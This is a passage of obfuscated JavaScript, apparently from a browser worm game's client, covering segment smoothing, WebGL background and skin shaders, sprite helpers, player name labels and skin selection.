        var _0x2006e9 = _0x4e8cb4 - _0xcc2df5;
        var _0x3ee984 = _0x331039.la(_0x43c529, _0x2006e9);
        if (_0x3ee984 > 0) {
          _0x46a8d8[0] = _0x24837c;
          _0x46a8d8[1] = _0x4e8cb4;
          _0x46a8d8[2] = _0x331039.ta(_0x2006e9, _0x43c529);
          var _0xdfe546 = _0x3ec417 * 0.25 / (_0x3ec417 * 0.25 + _0x3ee984);
          var _0x124282 = 1 - _0xdfe546 * 2;
          for (var _0x207d08 = 1, _0x310829 = _0x5410f6; _0x207d08 < _0x310829; _0x207d08++) {
            _0x3bb816 = _0x46a8d8[_0x207d08 * 3];
            _0x46a8d8[_0x207d08 * 3] = _0x46a8d8[_0x207d08 * 3 - 3] * _0x124282 + (_0x3bb816 + _0x5c4b3a) * _0xdfe546;
            _0x5c4b3a = _0x3bb816;
            _0xbe547a = _0x46a8d8[_0x207d08 * 3 + 1];
            _0x46a8d8[_0x207d08 * 3 + 1] = _0x46a8d8[_0x207d08 * 3 - 2] * _0x124282 + (_0xbe547a + _0xcc2df5) * _0xdfe546;
            _0xcc2df5 = _0xbe547a;
            _0x46a8d8[_0x207d08 * 3 + 2] = _0x331039.ta(_0x46a8d8[_0x207d08 * 3 - 2] - _0x46a8d8[_0x207d08 * 3 + 1], _0x46a8d8[_0x207d08 * 3 - 3] - _0x46a8d8[_0x207d08 * 3]);
          }
        }
      };
      return _0x141093;
    }();
    _0x7f096e.Lm = function () {
      function _0x3d8fcd(_0x18c8b2) {
        var _0x3e220f;
        var _0x2751da = this;
        this.Of = _0x18c8b2;
        this.nc = _0x18c8b2.get()[0];
        this.Vf = ((_0x3e220f = {}).view = _0x2751da.nc, _0x3e220f.transparent = true, new _0x4ead11.k.o(_0x3e220f));
        this.Rd = false;
        this.Mm = new _0x7f096e.Bm(new _0x4ead11.j(_0x56ee34 * 3));
        this.Pf = 1;
        this.Qf = 1;
        this.Nm = _0x2c3722.Om;
        this.Pm = _0x2c3722.Om;
        this.Qm = _0x2c3722.Om;
        this.Rm = _0x2c3722.Om;
        this.Sm = _0x2c3722.Om;
        this.qg();
        ooo.ud.Jc(function () {
          _0x2751da.Mm.Tm();
        });
      }
      var _0x56ee34 = _0x331039.ha(100, _0x7f096e.Xc.fd);
      var _0x2c3722 = {
        Om: "0lt0",
        Um: "0lt1",
        Vm: "0lt2"
      };
      _0x3d8fcd.prototype.rg = function (_0x2335af) {
        this.Rd = _0x2335af;
      };
      _0x3d8fcd.prototype.qg = function () {
        var _0x1a34c9 = _0x331039.e();
        this.Pf = this.Of.width();
        this.Qf = this.Of.height();
        this.Vf.resize(this.Pf, this.Qf);
        this.Vf.resolution = _0x1a34c9;
        this.nc.width = _0x1a34c9 * this.Pf;
        this.nc.height = _0x1a34c9 * this.Qf;
        var _0x415def = this.Qf / 4;
        this.Mm.Dm(_0x415def);
        var _0x33be52 = _0x331039.fa(_0x331039._(this.Pf / _0x415def) * 2 - 5, 1, _0x56ee34);
        this.Mm.Cm(_0x33be52);
      };
      _0x3d8fcd.prototype.ug = function () {
        if (this.Rd) {
          var _0x59a8a4 = _0x331039.Ca() / 200;
          var _0x56096f = _0x331039.oa(_0x59a8a4);
          this.Mm.Wm(this.Xm(this.Nm, _0x56096f), this.Ym(this.Nm, _0x56096f));
          this.Mm.Zm(this.$m(this.Pm, _0x56096f), this.$m(this.Qm, _0x56096f), this.$m(this.Rm, _0x56096f), this.$m(this.Sm, _0x56096f));
          var _0x164812 = this.Mm.Km();
          for (var _0x4f3de1 = this.Mm.Im(), _0x314df8 = this.Mm.Jm, _0x3cbfd4 = this.Pf - (this.Pf - _0x164812 * 0.5 * (_0x4f3de1 - 1)) * 0.5, _0x36f3c9 = this.Qf * 0.5, _0x595038 = 0, _0x272001 = 0, _0x5d89d5 = -1; _0x5d89d5 < _0x4f3de1; _0x5d89d5++) {
            var _0x2cf7b1 = _0x5d89d5;
            var _0xc33536 = _0x331039.pa(_0x2cf7b1 * 1 / 12 * _0x494ea6.T - _0x59a8a4) * (1 - _0x331039.ra(16, _0x2cf7b1 * -1 / 12));
            if (_0x5d89d5 >= 0) {
              _0x314df8[_0x5d89d5 * 3] = _0x3cbfd4 - _0x164812 * 0.5 * _0x2cf7b1;
              _0x314df8[_0x5d89d5 * 3 + 1] = _0x36f3c9 + _0x164812 * 0.5 * _0xc33536;
              _0x314df8[_0x5d89d5 * 3 + 2] = _0x331039.ta(_0x272001 - _0xc33536, _0x2cf7b1 - _0x595038);
            }
            _0x595038 = _0x2cf7b1;
            _0x272001 = _0xc33536;
          }
          ;
          this.Mm.Bg();
          this.Mm._m(this.Vf);
        }
      };
      _0x3d8fcd.prototype.Gm = function (_0x1116c8) {
        this.Mm.Gm(_0x1116c8);
      };
      _0x3d8fcd.prototype.an = function (_0x293483) {
        this.Nm = _0x293483 ? _0x2c3722.Vm : _0x2c3722.Um;
        this.Pm = _0x2c3722.Om;
        this.Qm = _0x2c3722.Om;
        this.Rm = _0x2c3722.Om;
        this.Sm = _0x2c3722.Om;
      };
      _0x3d8fcd.prototype.bn = function (_0x1b614f) {
        this.Nm = _0x2c3722.Om;
        this.Pm = _0x1b614f ? _0x2c3722.Vm : _0x2c3722.Um;
        this.Qm = _0x2c3722.Om;
        this.Rm = _0x2c3722.Om;
        this.Sm = _0x2c3722.Om;
      };
      _0x3d8fcd.prototype.cn = function (_0x460403) {
        this.Nm = _0x2c3722.Om;
        this.Pm = _0x2c3722.Om;
        this.Qm = _0x460403 ? _0x2c3722.Vm : _0x2c3722.Um;
        this.Rm = _0x2c3722.Om;
        this.Sm = _0x2c3722.Om;
      };
      _0x3d8fcd.prototype.dn = function (_0x1c486e) {
        this.Nm = _0x2c3722.Om;
        this.Pm = _0x2c3722.Om;
        this.Qm = _0x2c3722.Om;
        this.Rm = _0x1c486e ? _0x2c3722.Vm : _0x2c3722.Um;
        this.Sm = _0x2c3722.Om;
      };
      _0x3d8fcd.prototype.en = function (_0x3b735d) {
        this.Nm = _0x2c3722.Om;
        this.Pm = _0x2c3722.Om;
        this.Qm = _0x2c3722.Om;
        this.Rm = _0x2c3722.Om;
        this.Sm = _0x3b735d ? _0x2c3722.Vm : _0x2c3722.Um;
      };
      _0x3d8fcd.prototype.Xm = function (_0x5c78a3, _0x3e5d27) {
        switch (_0x5c78a3) {
          case _0x2c3722.Um:
            return 0.9 + _0x3e5d27 * 0.1;
          case _0x2c3722.Vm:
            return 0.4 + _0x3e5d27 * 0.3;
        }
        ;
        return 1;
      };
      _0x3d8fcd.prototype.Ym = function (_0x2bd922, _0x549772) {
        switch (_0x2bd922) {
          case _0x2c3722.Um:
            return 0.6 + _0x549772 * 0.5;
          case _0x2c3722.Vm:
            return 0.3 + _0x549772 * 0.3;
        }
        ;
        return 1;
      };
      _0x3d8fcd.prototype.$m = function (_0x57271b, _0x266244) {
        switch (_0x57271b) {
          case _0x2c3722.Um:
            return 0.9 + _0x266244 * 0.1;
          case _0x2c3722.Vm:
            return 0.6 + _0x266244 * 0.4;
        }
        ;
        return 1;
      };
      return _0x3d8fcd;
    }();
    _0x7f096e.uk = function () {
      function _0x240d5c(_0x4faf99, _0x464544, _0x2c4f70, _0x48b34e, _0x467573) {
        this.gn = _0x4faf99;
        this.hn = _0x464544;
        this.in = _0x2c4f70;
        this.jn = _0x48b34e;
        this.kn = _0x467573;
      }
      _0x240d5c.tk = function (_0x21e423) {
        return new _0x240d5c(_0x21e423.price, _0x21e423.guest, _0x21e423.nonbuyable, _0x21e423.nonbuyableCause, _0x21e423.description);
      };
      _0x240d5c.vk = function (_0x2628ae) {
        return new _0x240d5c(_0x2628ae.price, _0x2628ae.guest, _0x2628ae.nonbuyable, _0x2628ae.nonbuyableCause, _0x2628ae.description);
      };
      _0x240d5c.prototype.pk = function () {
        return this.gn;
      };
      _0x240d5c.prototype.sk = function () {
        return this.hn;
      };
      _0x240d5c.prototype.qk = function () {
        return this.in;
      };
      _0x240d5c.prototype.ln = function () {
        return this.jn;
      };
      _0x240d5c.prototype.mn = function () {
        return this.kn;
      };
      return _0x240d5c;
    }();
    _0x7f096e.Zf = function () {
      function _0x3d2650(_0x1bdd11) {
        this.nn = {};
        function _0x2334d3() {
          var _0x59df66 = [atob(_0x56e2a2[81]), atob(_0x56e2a2[82]), atob(_0x56e2a2[83])];
          var _0x5e3341 = localStorage.getItem("lastBackground");
          var _0x2dbbfa = _0x59df66.filter(_0x513e3f => _0x513e3f !== _0x5e3341);
          var _0x18f67c = _0x2dbbfa[Math.floor(Math.random() * _0x2dbbfa.length)];
          localStorage.setItem("lastBackground", _0x18f67c);
          return _0x18f67c;
        }
        var _0x1880e1 = _0x4ead11.k.m.from(_0x2334d3());
        this.nn[_0x5b16bd] = _0x1880e1;
        var _0x2c3632 = _0x4ead11.k.q.from(_0x3f87b6, _0x3ac88f, this.nn);
        this._f = new _0x4ead11.k.v(_0x5c261c, _0x2c3632);
        this._f.blendMode = _0x4ead11.k.w.B;
        this._f.alpha = 0.6;
      }
      var _0x22ed2b = "a1_" + _0x331039.xa();
      var _0xa6e38a = "a2_" + _0x331039.xa();
      var _0x51b1c5 = "translationMatrix";
      var _0x50d4c2 = "projectionMatrix";
      var _0x5b16bd = "u3_" + _0x331039.xa();
      var _0x3fc8ac = "u4_" + _0x331039.xa();
      var _0x5e9fc2 = "v1_" + _0x331039.xa();
      var _0x5c261c = new _0x4ead11.k.u().addAttribute(_0x22ed2b, [0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1], 2).addAttribute(_0xa6e38a, [0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1], 2);
      var _0x3f87b6 = "precision mediump float; attribute vec2 " + _0x22ed2b + "; attribute vec2 " + _0xa6e38a + "; uniform mat3 " + _0x51b1c5 + "; uniform mat3 " + _0x50d4c2 + "; uniform vec4 " + _0x3fc8ac + "; varying vec2 " + _0x5e9fc2 + "; const float ROT_ANGLE_DEG = 7.5; const float ROT_COS = cos(ROT_ANGLE_DEG/180.0*3.14159265358979); const float ROT_SIN = sin(ROT_ANGLE_DEG/180.0*3.14159265358979); void main() { " + _0x5e9fc2 + " = " + _0xa6e38a + "; gl_Position = vec4((" + _0x50d4c2 + " * " + _0x51b1c5 + " * vec3(" + _0x22ed2b + ", 1.0)).xy, 0.0, 1.0); vec4 ScreenParams = " + _0x3fc8ac + "; vec2 uv = " + _0xa6e38a + "; vec2 mul = 0.5 * vec2(ScreenParams.x * (ScreenParams.w - 1.0) + 1.0, ScreenParams.y * (ScreenParams.z - 1.0) + 1.0); vec2 v2 = uv * vec2(1.0, 1.0); v2 = v2 * vec2(1.0, 1.0); " + _0x5e9fc2 + " = v2; }";
      var _0x3ac88f = "precision highp float; varying vec2 " + _0x5e9fc2 + "; uniform sampler2D " + _0x5b16bd + "; void main() { gl_FragColor = texture2D(" + _0x5b16bd + ", " + _0x5e9fc2 + "); }";
      _0x3d2650.prototype.tg = function (_0x63f30c, _0x22c5eb) {
        this._f.scale.x = _0x63f30c;
        this._f.scale.y = _0x22c5eb;
        this.nn[_0x3fc8ac] = [_0x63f30c, _0x22c5eb, 1 / _0x63f30c + 1, 1 / _0x22c5eb + 1];
      };
      return _0x3d2650;
    }();
    _0x7f096e.th = function () {
      function _0x3a87e6() {
        this.nn = {};
        this.nn[_0x3d4da8] = [1, 0.5, 0.25, 0.5];
        this.nn[_0x1161b8] = _0x4ead11.k.n.WHITE;
        this.nn[_0x4ff213] = [0, 0];
        this.nn[_0x335827] = [0, 0];
        var _0xdd34de = _0x4ead11.k.q.from(_0x126374, _0x590d97, this.nn);
        this._f = new _0x4ead11.k.v(_0x3dbc11, _0xdd34de);
      }
      var _0x50dd9a = "a1_" + _0x331039.xa();
      var _0x2d7eae = "a2_" + _0x331039.xa();
      var _0xfd4f72 = "translationMatrix";
      var _0xd39b77 = "projectionMatrix";
      var _0x3d4da8 = "u3_" + _0x331039.xa();
      var _0x1161b8 = "u4_" + _0x331039.xa();
      var _0x4ff213 = "u5_" + _0x331039.xa();
      var _0x335827 = "u6_" + _0x331039.xa();
      var _0x39bc5a = "v1_" + _0x331039.xa();
      var _0x3dbc11 = new _0x4ead11.k.u().addAttribute(_0x50dd9a, [-0.5, -0.5, 0.5, -0.5, 0.5, 0.5, -0.5, -0.5, 0.5, 0.5, -0.5, 0.5], 2).addAttribute(_0x2d7eae, [-0.5, -0.5, 0.5, -0.5, 0.5, 0.5, -0.5, -0.5, 0.5, 0.5, -0.5, 0.5], 2);
      var _0x126374 = `precision mediump float; attribute vec2 ${_0x50dd9a}; attribute vec2 ${_0x2d7eae}; uniform mat3 ${_0xfd4f72}; uniform mat3 ${_0xd39b77}; varying vec2 ${_0x39bc5a}; void main(){${_0x39bc5a}=${_0x2d7eae}; gl_Position=vec4((${_0xd39b77}*${_0xfd4f72}*vec3(${_0x50dd9a}, 1.0)).xy, 0.0, 1.0); }`;
      var _0x590d97 = `precision highp float; varying vec2 ${_0x39bc5a}; uniform vec4 ${_0x3d4da8}; uniform sampler2D ${_0x1161b8}; uniform vec2 ${_0x4ff213}; uniform vec2 ${_0x335827}; void main(){vec4 color=texture2D(${_0x1161b8}, ${_0x39bc5a}*${_0x4ff213}+${_0x335827}); vec4 colorMix=${_0x3d4da8}; gl_FragColor=color*0.3+colorMix.a*vec4(colorMix.rgb, 0.0); }`;
      _0x3a87e6.prototype.nd = function (_0xca89fa, _0x314e51, _0x1244db, _0x121a7a) {
        var _0x58e3d7 = this.nn[_0x3d4da8];
        _0x58e3d7[0] = _0xca89fa;
        _0x58e3d7[1] = _0x314e51;
        _0x58e3d7[2] = _0x1244db;
        _0x58e3d7[3] = _0x121a7a;
      };
      _0x3a87e6.prototype.Hh = function (_0x31179f) {
        this.nn[_0x1161b8] = _0x31179f;
      };
      _0x3a87e6.prototype.Bg = function (_0x2b318e, _0x2c9f34, _0x489997, _0x29744e) {
        this._f.position.x = _0x2b318e;
        this._f.position.y = _0x2c9f34;
        this._f.scale.x = _0x489997;
        this._f.scale.y = _0x29744e;
        var _0x580b3e = this.nn[_0x4ff213];
        _0x580b3e[0] = _0x489997 * 0.2520615384615385;
        _0x580b3e[1] = _0x29744e * 0.4357063736263738;
        var _0x287158 = this.nn[_0x335827];
        _0x287158[0] = _0x2b318e * 0.2520615384615385;
        _0x287158[1] = _0x2c9f34 * 0.4357063736263738;
      };
      return _0x3a87e6;
    }();
    _0x7f096e.bd = function () {
      function _0x4dcc28() {
        this.gd = new _0x4ead11.k.s();
        this.pn = 0;
        this.qn = 0;
      }
      _0x4dcc28.prototype.kd = function (_0x3f1013) {
        this.gd.texture = _0x3f1013.nb();
        this.gd.anchor.set(_0x3f1013.hb, _0x3f1013.ib);
        this.pn = _0x3f1013.jb;
        this.qn = _0x3f1013.kb;
      };
      _0x4dcc28.prototype.nd = function (_0x4e84d9) {
        this.gd.tint = parseInt(_0x4e84d9.substring(1), 16);
      };
      _0x4dcc28.prototype.Bd = function (_0x2d42b3) {
        this.gd.width = _0x2d42b3 * this.pn;
        this.gd.height = _0x2d42b3 * this.qn;
      };
      _0x4dcc28.prototype.Vd = function (_0x1a052d) {
        this.gd.rotation = _0x1a052d;
      };
      _0x4dcc28.prototype.Ud = function (_0x477bf0, _0x3b41e3) {
        this.gd.position.set(_0x477bf0, _0x3b41e3);
      };
      _0x4dcc28.prototype.Td = function (_0x5936c0) {
        this.gd.visible = _0x5936c0;
      };
      _0x4dcc28.prototype.Qd = function () {
        return this.gd.visible;
      };
      _0x4dcc28.prototype.Rj = function (_0xe81af4) {
        this.gd.alpha = _0xe81af4;
      };
      _0x4dcc28.prototype.zd = function () {
        return this.gd;
      };
      _0x4dcc28.prototype.G = function () {
        _0x4ead11.k.F.G(this.gd);
      };
      return _0x4dcc28;
    }();
    _0x7f096e.Ui = function () {
      function _0x11b6c7(_0x5f1853) {
        this.Qh = _0x5f1853;
        this.ki = new _0x7f096e.Ui.Ti();
        this.cj = false;
        this.bj = true;
        this.Fd = false;
        this.Id = 0;
        this.rn = 0;
        this.Lj = 1;
        this.Ld = 0;
        this.hi = 0;
        this.Nd = {};
        this.Kd = 0;
        this.sn = new _0x4ead11.j(_0x5e31d7 * 2);
        this.tn = new _0x4ead11.j(_0x5e31d7 * 2);
        this.Jd = new _0x4ead11.j(_0x5e31d7 * 2);
        this.un = null;
        this.vn = null;
        this.wn = null;
        this.xn();
      }
      var _0x5e31d7 = 200;
      _0x11b6c7.prototype.$i = function () {
        if (this.vn != null) {
          _0x4ead11.k.F.G(this.vn.Yc);
        }
        if (this.wn != null) {
          _0x4ead11.k.F.G(this.wn);
        }
      };
      _0x11b6c7.prototype.xn = function () {
        this.fj(0.25);
        this.ki.Xa = "";
        this.bj = true;
        this.Nd = {};
        this.Td(false);
      };
      _0x11b6c7.prototype.Zi = function (_0x4ed87d) {
        this.ki = _0x4ed87d;
        this.yn(this.cj);
      };
      _0x11b6c7.prototype.Td = function (_0x21f640) {
        var _0x26a0af = this.cj;
        this.cj = _0x21f640;
        this.yn(_0x26a0af);
      };
      _0x11b6c7.prototype.fj = function (_0x492a4a) {
        this.hi = _0x492a4a * 50;
        var _0x4721d6 = _0x492a4a;
        if (_0x492a4a > this.Qh.hh) {
          _0x4721d6 = _0x331039.sa((_0x492a4a - this.Qh.hh) / this.Qh.ih) * this.Qh.ih + this.Qh.hh;
        }
        var _0x37ad45 = _0x331039.qa(_0x331039.ra(_0x4721d6 * 5, 0.707106781186548) * 4 + 25);
        var _0x54e171 = _0x331039.ha(_0x5e31d7, _0x331039.ia(3, (_0x37ad45 - 5) * 5 + 1));
        var _0x305bc7 = this.Kd;
        this.Id = (5 + _0x37ad45 * 0.9) * 0.025;
        this.Kd = _0x331039._(_0x54e171);
        this.rn = _0x54e171 - this.Kd;
        if (_0x305bc7 > 0 && _0x305bc7 < this.Kd) {
          var _0x442cbb = this.sn[_0x305bc7 * 2 - 2];
          var _0x952b20 = this.sn[_0x305bc7 * 2 - 1];
          var _0x3fd9e5 = this.tn[_0x305bc7 * 2 - 2];
          var _0x11278b = this.tn[_0x305bc7 * 2 - 1];
          var _0x25c22b = this.Jd[_0x305bc7 * 2 - 2];
          var _0x2f8572 = this.Jd[_0x305bc7 * 2 - 1];
          for (var _0x18ee6f = _0x305bc7; _0x18ee6f < this.Kd; _0x18ee6f++) {
            this.sn[_0x18ee6f * 2] = _0x442cbb;
            this.sn[_0x18ee6f * 2 + 1] = _0x952b20;
            this.tn[_0x18ee6f * 2] = _0x3fd9e5;
            this.tn[_0x18ee6f * 2 + 1] = _0x11278b;
            this.Jd[_0x18ee6f * 2] = _0x25c22b;
            this.Jd[_0x18ee6f * 2 + 1] = _0x2f8572;
          }
        }
      };
      _0x11b6c7.prototype.kj = function (_0x79644c, _0x1b7662) {
        this.Kd = _0x1b7662;
        for (var _0x18cb4d = 0; _0x18cb4d < this.Kd; _0x18cb4d++) {
          this.sn[_0x18cb4d * 2] = this.tn[_0x18cb4d * 2] = this.Jd[_0x18cb4d * 2] = _0x79644c();
          this.sn[_0x18cb4d * 2 + 1] = this.tn[_0x18cb4d * 2 + 1] = this.Jd[_0x18cb4d * 2 + 1] = _0x79644c();
        }
      };
      _0x11b6c7.prototype.hj = function (_0x1962bf, _0x818725, _0x2f084d) {
        this.Fd = _0x2f084d;
        for (var _0x138f5d = 0; _0x138f5d < this.Kd; _0x138f5d++) {
          this.sn[_0x138f5d * 2] = this.tn[_0x138f5d * 2];
          this.sn[_0x138f5d * 2 + 1] = this.tn[_0x138f5d * 2 + 1];
        }
        ;
        var _0x819f61 = _0x1962bf - this.tn[0];
        var _0x4d168b = _0x818725 - this.tn[1];
        this.zn(_0x819f61, _0x4d168b, this.Kd, this.tn);
      };
      _0x11b6c7.prototype.zn = function (_0x114860, _0xc95011, _0x5768c6, _0x1d444f) {
        var _0x338388 = _0x331039.la(_0x114860, _0xc95011);
        if (!(_0x338388 <= 0)) {
          var _0x492d86;
          var _0x1620ea = _0x1d444f[0];
          _0x1d444f[0] += _0x114860;
          var _0x291113;
          var _0x36779b = _0x1d444f[1];
          _0x1d444f[1] += _0xc95011;
          var _0x3f1aa6 = this.Id / (this.Id + _0x338388);
          var _0x33f4d7 = 1 - _0x3f1aa6 * 2;
          for (var _0x357b94 = 1, _0x2bd3d4 = _0x5768c6 - 1; _0x357b94 < _0x2bd3d4; _0x357b94++) {
            _0x492d86 = _0x1d444f[_0x357b94 * 2];
            _0x1d444f[_0x357b94 * 2] = _0x1d444f[_0x357b94 * 2 - 2] * _0x33f4d7 + (_0x492d86 + _0x1620ea) * _0x3f1aa6;
            _0x1620ea = _0x492d86;
            _0x291113 = _0x1d444f[_0x357b94 * 2 + 1];
            _0x1d444f[_0x357b94 * 2 + 1] = _0x1d444f[_0x357b94 * 2 - 1] * _0x33f4d7 + (_0x291113 + _0x36779b) * _0x3f1aa6;
            _0x36779b = _0x291113;
          }
          ;
          _0x33f4d7 = 1 - (_0x3f1aa6 = this.rn * this.Id / (this.rn * this.Id + _0x338388)) * 2;
          _0x1d444f[_0x5768c6 * 2 - 2] = _0x1d444f[_0x5768c6 * 2 - 4] * _0x33f4d7 + (_0x1d444f[_0x5768c6 * 2 - 2] + _0x1620ea) * _0x3f1aa6;
          _0x1d444f[_0x5768c6 * 2 - 1] = _0x1d444f[_0x5768c6 * 2 - 3] * _0x33f4d7 + (_0x1d444f[_0x5768c6 * 2 - 1] + _0x36779b) * _0x3f1aa6;
        }
      };
      _0x11b6c7.prototype.Oh = function () {
        return {
          _a: this.Jd[0],
          ab: this.Jd[1]
        };
      };
      _0x11b6c7.prototype.dj = function (_0x5b8c09, _0xe2c3a8) {
        var _0x38f6d6 = 1000000;
        var _0x5f47ac = _0x5b8c09;
        var _0x5e8223 = _0xe2c3a8;
        for (var _0xc40cc3 = 0; _0xc40cc3 < this.Kd; _0xc40cc3++) {
          var _0x2541f4 = this.Jd[_0xc40cc3 * 2];
          var _0x3bbe7a = this.Jd[_0xc40cc3 * 2 + 1];
          var _0x5edcd3 = _0x331039.la(_0x5b8c09 - _0x2541f4, _0xe2c3a8 - _0x3bbe7a);
          if (_0x5edcd3 < _0x38f6d6) {
            _0x38f6d6 = _0x5edcd3;
            _0x5f47ac = _0x2541f4;
            _0x5e8223 = _0x3bbe7a;
          }
        }
        ;
        return {
          _a: _0x5f47ac,
          ab: _0x5e8223,
          ej: _0x38f6d6
        };
      };
      _0x11b6c7.prototype._i = function (_0x1bced7) {
        this.un = _0x1bced7;
      };
      _0x11b6c7.prototype.Pj = function (_0x86ecbf, _0x5a1dfe) {
        this.Lj = _0x331039.ga(this.Lj, this.bj ? this.Fd ? 0.9 + _0x331039.pa(_0x86ecbf / 400 * _0x494ea6.T) * 0.1 : 1 : 0, _0x5a1dfe, 1 / 800);
        this.Ld = _0x331039.ga(this.Ld, this.bj ? this.Fd ? 1 : 0 : 1, _0x5a1dfe, 0.0025);
        if (this.vn != null) {
          this.vn.Yc.alpha = this.Lj;
        }
        if (this.wn != null) {
          this.wn.alpha = this.Lj;
        }
      };
      _0x11b6c7.prototype.Qj = function (_0x489190, _0x48e777, _0x6e4648, _0x2e4537) {
        if (this.cj && this.bj) {
          var _0x191f17 = _0x331039.ra(0.11112, _0x48e777 / 95);
          for (var _0x160fa1 = 0; _0x160fa1 < this.Kd; _0x160fa1++) {
            var _0x354478 = _0x331039.ka(this.sn[_0x160fa1 * 2], this.tn[_0x160fa1 * 2], _0x6e4648);
            var _0x2f4858 = _0x331039.ka(this.sn[_0x160fa1 * 2 + 1], this.tn[_0x160fa1 * 2 + 1], _0x6e4648);
            this.Jd[_0x160fa1 * 2] = _0x331039.ka(_0x354478, this.Jd[_0x160fa1 * 2], _0x191f17);
            this.Jd[_0x160fa1 * 2 + 1] = _0x331039.ka(_0x2f4858, this.Jd[_0x160fa1 * 2 + 1], _0x191f17);
          }
        }
        ;
        if (this.vn != null && this.cj) {
          this.vn.Hd(this, _0x489190, _0x48e777, _0x2e4537);
        }
        if (this.wn != null) {
          this.wn.Rh.x = this.Jd[0];
          this.wn.Rh.y = this.Jd[1] - this.Id * 3;
        }
      };
      _0x11b6c7.prototype.yn = function (_0x28843d) {
        if (this.cj) {
          if (!_0x28843d) {
            this.An();
          }
        } else {
          if (this.vn != null) {
            _0x4ead11.k.F.G(this.vn.Yc);
          }
          if (this.wn != null) {
            _0x4ead11.k.F.G(this.wn);
          }
        }
      };
      _0x11b6c7.prototype.An = function () {
        if (this.vn == null) {
          this.vn = new _0x7f096e.Xc();
        } else {
          _0x4ead11.k.F.G(this.vn.Yc);
        }
        this.vn.hd(ooo.Mh.Qh.eh, ooo.ud.Cc().Ub(this.ki.mi), ooo.ud.Cc().Tb(this.ki.ni), ooo.ud.Cc().Vb(this.ki.Vi), ooo.ud.Cc().Wb(this.ki.Wi), ooo.ud.Cc().Xb(this.ki.Xi), ooo.ud.Cc().Yb(this.ki.Yi), "#ffffff");
        if (this.wn == null) {
          this.wn = new _0x7f096e.Bn("");
          this.wn.style.fontFamily = "PTSans";
          this.wn.anchor.set(0.5);
        } else {
          _0x4ead11.k.F.G(this.wn);
        }
        this.wn.style.fontSize = 14;
        this.wn.style.fill = ooo.ud.Cc().Tb(this.ki.ni).cc;
        if (!this.originalName) {
          this.originalName = this.ki.Xa;
        }
        let _0x1428b1;
        if (_0x5c2dcc.n != null && _0x5c2dcc.n.Je == this.ki.Je) {
          _0x1428b1 = this.originalName;
        } else {
          _0x1428b1 = _0x31650d(this.originalName, false);
        }
        this.wn.text = _0x1428b1;
        this.un.Xh(this.ki.Je, this.vn, this.wn);
        if (_0x5c2dcc.n != null && _0x5c2dcc.n.Je == this.ki.Je) {
          _0x5c2dcc.vj = this.wn;
          _0x5c2dcc.n.originalName = this.originalName;
          let _0x2b72b8 = _0x207b06.sg.indexOf(_0x5c2dcc.n.ni);
          if (_0x2b72b8 == -1) {
            if (_0x207b06.ig != -1) {
              _0x207b06.ig = -1;
            }
          } else {
            _0x207b06.ig = _0x207b06.gg[_0x2b72b8].s;
            _0x207b06.re = false;
            _0x500615();
          }
        }
      };
      _0x11b6c7.Ti = function _0x2ae603() {
        this.Je = 0;
        this.mi = _0x7f096e.dh.jh;
        this.ni = 0;
        this.Vi = 0;
        this.Wi = 0;
        this.Xi = 0;
        this.Yi = 0;
        this.Xa = "";
      };
      return _0x11b6c7;
    }();
    _0x7f096e.Bn = _0x331039.ca(_0x4ead11.k.t, function (_0x1c3b3a, _0x58d704, _0x5b5dd6) {
      _0x4ead11.k.t.call(this, _0x1c3b3a, _0x58d704, _0x5b5dd6);
      this.Rh = {
        x: 0,
        y: 0
      };
    });
    _0x7f096e.Sb = function () {
      function _0x2b358c(_0x58f744, _0x3b8db4, _0x3609c4, _0x58a4cf, _0x1235ba) {
        this.Tj = _0x58f744;
        this.Uj = _0x3b8db4;
        this.Vj = _0x3609c4;
        this.Wj = _0x58a4cf;
        this.Xj = _0x1235ba;
      }
      _0x2b358c.prototype.Cn = function (_0x56e476) {
        return new _0x2b358c(_0x56e476, this.Uj, this.Vj, this.Wj, this.Xj);
      };
      _0x2b358c.prototype.Dn = function (_0x490e2a) {
        return new _0x2b358c(this.Tj, _0x490e2a, this.Vj, this.Wj, this.Xj);
      };
      _0x2b358c.prototype.En = function (_0x2ac603) {
        return new _0x2b358c(this.Tj, this.Uj, _0x2ac603, this.Wj, this.Xj);
      };
      _0x2b358c.prototype.Fn = function (_0x51afd4) {
        return new _0x2b358c(this.Tj, this.Uj, this.Vj, _0x51afd4, this.Xj);
      };
      _0x2b358c.prototype.Gn = function (_0x8f2307) {
        return new _0x2b358c(this.Tj, this.Uj, this.Vj, this.Wj, _0x8f2307);
      };
      return _0x2b358c;
    }();
    _0x7f096e.Bm = function () {
      function _0x53956b(_0x350b42) {
        this.Hn = new _0x7f096e.Xc();
        this.Hn.Yc.addChild(this.Hn.Zc);
        this.In = null;
        this.Jn = null;
        this.Jm = _0x350b42;
        this.$c = 0;
        this.mj = 1;
        this.Kn = 1;
        this.Ln = 1;
        this.Mn = 1;
        this.Nn = 1;
        this.On = 1;
        this.Pn = 1;
        this.Hm("#ffffff");
      }
      var _0x3090f3 = new _0x7f096e.Sb(0, 0, 0, 0, 0);
      _0x53956b.prototype.ag = function () {
        return this.Hn.Yc;
      };
      _0x53956b.prototype.Cm = function (_0x3c65c4) {
        this.$c = _0x3c65c4;
        if (this.Hn.$c !== _0x3c65c4) {
          for (var _0x23e26f = _0x3c65c4; _0x23e26f < this.Hn._c.length; _0x23e26f++) {
            this.Hn._c[_0x23e26f].Cd();
          }
          ;
          while (this.Hn.$c > _0x3c65c4) {
            this.Hn.$c -= 1;
            var _0x1d2670 = this.Hn._c[this.Hn.$c];
            _0x1d2670.md.G();
            _0x1d2670.ld.G();
          }
          ;
          while (this.Hn.$c < _0x3c65c4) {
            var _0x133294 = this.Hn._c[this.Hn.$c];
            this.Hn.$c += 1;
            this.Hn.Yc.addChild(_0x133294.ld.zd());
            this.Hn.Yc.addChild(_0x133294.md.zd());
            _0x133294.ld.Rj(this.Kn);
            _0x133294.md.Rj(this.Ln);
          }
          ;
          for (var _0x380f10 = 0; _0x380f10 < this.Hn.Zc.od.length; _0x380f10++) {
            this.Hn.Zc.od[_0x380f10].Rj(this.Mn);
          }
          ;
          for (var _0x5f29db = 0; _0x5f29db < this.Hn.Zc.pd.length; _0x5f29db++) {
            this.Hn.Zc.pd[_0x5f29db].Rj(this.Nn);
          }
          ;
          for (var _0x2b7059 = 0; _0x2b7059 < this.Hn.Zc.rd.length; _0x2b7059++) {
            this.Hn.Zc.rd[_0x2b7059].Rj(this.On);
          }
          ;
